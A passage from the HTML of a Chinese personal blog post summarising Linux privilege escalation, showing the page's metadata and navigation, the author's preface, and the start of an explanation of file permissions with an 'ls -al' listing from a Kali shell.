@@ -1,0 +1,2260 @@
+
+<!DOCTYPE html><html lang="zh-CN">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1" theme-name="Stellar" theme-version="1.28.1">
+  
+  <meta name="generator" content="Hexo 7.2.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f9fafb">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  
+  <title>Linux提权总结 - hybcx's blog</title>
+
+  
+    <meta name="description" content="0x01 前言 本文旨在给自己日后Linux提权的时候提供些许帮助，虽然此前学过Linux提权，但也仅仅是针对某个知识。如今也是时候总结一番了。 这里先放一个Linux基础以及进阶知识的总结：LearnLinux 如果系统学习Linux，必然是一个漫长之旅，目前只能是把它当作进阶。至于在本文中遇到的相关Linux提权的Linux知识，会在遇到的时候在学习，而不是刻意去学习，不然必然很艰辛。 0x0">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux提权总结">
+<meta property="og:url" content="http://hybcx.xyz/2024/07/21/linux-ti-quan-zong-jie/index.html">
+<meta property="og:site_name" content="hybcx&#39;s blog">
+<meta property="og:description" content="0x01 前言 本文旨在给自己日后Linux提权的时候提供些许帮助，虽然此前学过Linux提权，但也仅仅是针对某个知识。如今也是时候总结一番了。 这里先放一个Linux基础以及进阶知识的总结：LearnLinux 如果系统学习Linux，必然是一个漫长之旅，目前只能是把它当作进阶。至于在本文中遇到的相关Linux提权的Linux知识，会在遇到的时候在学习，而不是刻意去学习，不然必然很艰辛。 0x0">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543387.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543389.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543390.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543391.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543392.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543393.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543394.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543395.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543396.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543397.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543398.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543399.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543400.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543401.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543402.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543403.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543404.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543405.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543406.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543407.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543408.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543409.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543410.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543411.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543412.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543413.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543414.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543416.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543417.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543418.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543419.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543420.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543421.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543422.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543423.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543424.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543425.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543426.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543427.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543428.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543429.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543430.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543431.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543432.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543433.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543434.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543435.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543436.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543437.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543438.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543439.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543440.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543441.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543442.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543443.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543444.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543445.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543446.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543447.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543448.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543449.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543450.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543451.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543452.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543453.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543454.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543455.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543456.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543457.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543458.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543459.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543460.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543461.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543462.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543463.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543464.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543465.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543466.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543467.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543468.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543469.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543470.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543471.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543472.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543473.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543474.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543475.png">
+<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240212141357152.png">
+<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240212141459472.png">
+<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240212141823578.png">
+<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240212142933208.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543476.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543477.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543478.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543479.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543480.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543481.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543482.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543483.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543484.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543485.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543486.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543487.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543488.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543489.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543490.png">
+<meta property="article:published_time" content="2024-07-21T05:48:20.000Z">
+<meta property="article:modified_time" content="2024-07-24T07:56:14.540Z">
+<meta property="article:author" content="hybcx">
+<meta property="article:tag" content="Linux提权">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543387.png">
+  
+  
+  
+  <meta name="keywords" content="Linux提权">
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="hybcx's blog" type="application/atom+xml">
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.28.1">
+
+  
+    <link rel="shortcut icon" href="/medias/logo.png">
+  
+
+  
+    
+<link rel="stylesheet" href="https://gcore.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/styles/atom-one-dark.min.css">
+
+  
+
+  <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'">
+
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+<body>
+
+<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">hybcx's blog</div><div class="sub normal cap">人生当是精彩的</div><div class="sub hover cap" style="opacity:0"> 何必忧虑未来！</div></a></div></header>
+
+<div class="nav-area">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="友链" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
+</div>
+<div class="widgets">
+
+
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2024/07/25/thm-windows-api-jie-shao/"><span class="title">THM-Windows-API介绍</span></a><a class="item title" href="/2024/07/24/thm-windows-nei-he/"><span class="title">THM-Windows内核</span></a><a class="item title" href="/2024/07/20/thm-shu-ju-xie-lu/"><span class="title">THM-数据泄露</span></a><a class="item title" href="/2024/07/21/linux-ti-quan-zong-jie/"><span class="title">Linux提权总结</span></a><a class="item title" href="/2024/07/16/thm-enumeration/"><span class="title">THM-Enumeration</span></a><a class="item title" href="/2024/07/16/thm-dang-qian-tai-shi/"><span class="title">THM-当前态势</span></a><a class="item title" href="/2024/02/10/thm-linux-quan-xian-ti-sheng/"><span class="title">THM-Linux权限提升</span></a><a class="item title" href="/2024/02/14/thm-basic-pentesting/"><span class="title">THM-Basic Pentesting</span></a><a class="item title" href="/2024/07/20/linux-ti-quan-xue-xi-yi/"><span class="title">Linux提权学习之rbash逃逸</span></a><a class="item title" href="/2023/08/07/qian-xi-mu-lu-chuan-yue/"><span class="title">浅析目录穿越</span></a></div></widget>
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/hybchenxing/" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/github-logo2.png"/></a><a class="social" href="https://music.163.com/#/user/home?id=9895561810" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/neteasemusic-icon.png"/></a><a class="social" href="https://space.bilibili.com/1761635300" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/bilibili-icon.png"/></a><a class="social" href="https://muselink.cc/hybcx" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/weChat.png"/></a><a class="social" href="javaScript:void('永夜');" rel="noopener noreferrer"><img class="lazy" id="ThemeM" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/moon.svg"/></a><a class="social" href="javaScript:void('永昼');" rel="noopener noreferrer"><img class="lazy" id="ThemeL" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/sun.svg"/></a></div></footer>
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/Linux%E6%8F%90%E6%9D%83/">Linux提权</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-07-21T05:48:20.000Z">2024-07-21</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-07-24T07:56:14.540Z">2024-07-24</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>Linux提权总结</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h1 id="0x01-前言">0x01 前言</h1>
+<p>本文旨在给自己日后Linux提权的时候提供些许帮助，虽然此前学过Linux提权，但也仅仅是针对某个知识。如今也是时候总结一番了。</p>
+<p>这里先放一个Linux基础以及进阶知识的总结：<a target="_blank" rel="noopener" href="https://github.com/0e0w/Linux?tab=readme-ov-file">LearnLinux</a><br>
+如果系统学习Linux，必然是一个漫长之旅，目前只能是把它当作进阶。至于在本文中遇到的相关Linux提权的Linux知识，会在遇到的时候在学习，而不是刻意去学习，不然必然很艰辛。</p>
+<h1 id="0x02-linux基础知识">0x02 Linux基础知识</h1>
+<h2 id="什么是权限">什么是权限</h2>
+<p>在Linux 系统中，<code>ls -al</code>&nbsp;即可查看列出文件所属的权限。这里我用kali 系统来演示。</p>
+<pre><code class="hljs scss">┌──(hybcx㉿LAPTOP-<span class="hljs-number">1</span>TO1HS75)-<span class="hljs-selector-attr">[~/Proxy/iodine]</span>
+└─$ ls -al                                                                                             
+total <span class="hljs-number">88</span>
+drwxrwxr-x <span class="hljs-number">8</span> hybcx hybcx  <span class="hljs-number">4096</span> Jul <span class="hljs-number">20</span> <span class="hljs-number">21</span>:<span class="hljs-number">54</span> .
+drwxrwxr-x <span class="hljs-number">4</span> hybcx hybcx  <span class="hljs-number">4096</span> Jul <span class="hljs-number">20</span> <span class="hljs-number">21</span>:<span class="hljs-number">53</span> ..
+-rw-rw-r-- <span class="hljs-number">1</span> hybcx hybcx  <span class="hljs-number">8681</span> Jul <span class="hljs-number">20</span> <span class="hljs-number">21</span>:<span class="hljs-number">54</span> CHANGELOG
+drwxrwxr-x <span class="hljs-number">2</span> hybcx hybcx  <span class="hljs-number">4096</span> Jul <span class="hljs-number">20</span> <span class="hljs-number">21</span>:<span class="hljs-number">54</span> doc
